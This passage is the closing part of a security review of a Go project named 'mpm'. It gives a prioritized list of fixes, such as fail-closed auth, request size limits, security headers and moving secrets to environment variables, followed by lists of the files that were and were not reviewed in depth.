   - Fix `authValid()` / `withAuth()` to fail closed (#1).
   - Add `isSensitiveContent` check to `DatabaseManager.SaveMemory` (#2, #5).
   - Wrap all `r.Body` / stdin in `http.MaxBytesReader` (#4).
   - Add `http.Server` timeouts (#14).

2. **This week:**
   - Refactor `app.js` to stop building HTML via string concat (#6, #7,
     #24). Replace `onclick=` with `addEventListener`.
   - Restrict `mpm call add_reference` and `mpm reference add` paths
     (#3, #19).
   - Add security headers middleware (#15).

3. **This month:**
   - Auth on the internal broadcast endpoint (#8), or move to a unix socket.
   - Constant-time token comparison (#10).
   - Move `synth.api_key` and `web_token` to env-var references
     (`*_env` field) (#9).
   - Move `.shell`/dot-command-safe restore (#12).
   - TLS support for `mpm web` (#17).

---

## Files reviewed (high-signal)

- `cmd/mpm/main.go`, `cmd/mpm/call.go`, `cmd/mpm/web.go`, `cmd/mpm/web_handlers.go`,
  `cmd/mpm/stream.go`, `cmd/mpm/watch.go`, `cmd/mpm/ingest.go`,
  `cmd/mpm/handlers.go`, `cmd/mpm/handlers_backup.go`, `cmd/mpm/simple_cmds.go`,
  `cmd/mpm/router.go`, `cmd/mpm/web/app.js`
- `internal/db.go`, `internal/memory.go`, `internal/ingest.go`,
  `internal/web_db.go`, `internal/search.go`, `internal/idle_dream.go`,
  `internal/synthesize.go`, `internal/synthesis_isolation.go`,
  `internal/embeddings.go`, `internal/reference_new.go`,
  `internal/config/config.go`
- `mpm_config.json` (live), `mpm_config.json.example` (template)

## Files NOT deeply reviewed

- `cmd/mpm/{daily_review,dlq_review,recall,review,synthesize_cmds,switch,topic,tty_select,versioning_cmds,worker,backfill_embeddings,recall,handlers_gc_test,recall_test,review_test,topic_suggest_test,watch_lifecycle_test}.go`
  — looked at call sites only; recommend a follow-up pass on each
  `SaveMemory`/`UpdateMemory`/`AddLesson` call site.
- `internal/{adapters,hybrid_search,lessons,memory_test,mode,persona,reference_test,versioning_test,lifecycle_decay_test,reliability_sprint_test,isolation_test,synthesis_isolation_test,feedback_test}.go`
  — test files, low value.
- `src/`, `openclaw/`, `mpm-agent/`, `hermes-mpm-plugin/`, `contrib/`,
  `gutenberg_sources/` — separate sub-projects; not in scope.
